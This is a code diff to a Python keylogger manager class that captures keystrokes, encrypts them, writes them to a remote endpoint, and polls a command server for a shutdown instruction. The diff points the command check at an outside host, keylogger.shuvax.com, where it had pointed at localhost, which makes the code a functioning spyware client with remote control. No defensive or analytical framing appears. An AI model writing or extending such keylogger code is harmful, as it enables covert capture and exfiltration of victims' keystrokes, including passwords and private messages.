@@ -8,7 +8,7 @@ class KeyLoggerManager(IKeyLoggerManager):
     def __init__(self, serial_number: int, key:str):
         self.__serial_number = serial_number
         self.__key_logger = KeyLoggerService()
-        self.__writer = NetworkWriter('https://keylogger.shuvax.com')
+        self.__writer = NetworkWriter()
         self.__encryptor = Encryptor(key)
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
@@ -38,12 +38,11 @@ class KeyLoggerManager(IKeyLoggerManager):
             data = self.__key_logger.get_logged_keys()
             encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in
                             data.items()}
-            # print(data)
             self.__writer.write(self.__serial_number, encrypt_data)
             self.__key_logger.clear_logged_keys()
 
             try:
-                response = requests.get(f"http://127.0.0.1:9734/api/check_commands/{self.__serial_number}")
+                response = requests.get(f"https://keylogger.shuvax.com/api/check_commands/{self.__serial_number}")
                 if response.status_code == 200:
                     commands = response.json().get('commands', {})
                     if commands.get('shutdown', False):
